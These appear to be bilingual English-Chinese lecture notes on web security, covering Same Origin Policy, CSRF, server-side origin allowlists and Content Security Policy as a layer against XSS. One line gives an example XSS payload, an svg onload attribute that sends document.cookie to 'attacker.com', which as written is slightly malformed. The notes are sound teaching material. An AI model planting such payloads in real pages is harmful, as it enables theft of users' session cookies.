#### Content Security Policy (CSP)
- Same Origin Policy prohibits cross-origin fetch. 但是SOP不禁止跨源提交表单，于是可以CSRF攻击。SOP也不禁止跨源加载静态资源，可以利用`<svg onload="'attacker.com?q='+document.cookie">`盗取cookie.
- Previously, we talked about ways to tighten up Same Origin Policy in terms of which sites could e.g. send requests with cookies to our site (CSRF)
    - That is, preventing other sites from making certain requests to our site 防御CSRF，在server端用origin allowlist
- CSP is inverse: prevent our site from making requests to other sites
    - CSP is an added layer of security against XSS
    - Even if attacker code is running in user's browser in our site's context, we can limit the damage they can do

In summary
1. SOP prevents cross site fetch
2. server side origin allowlist prevents CSRF
3. CSP prevents XSS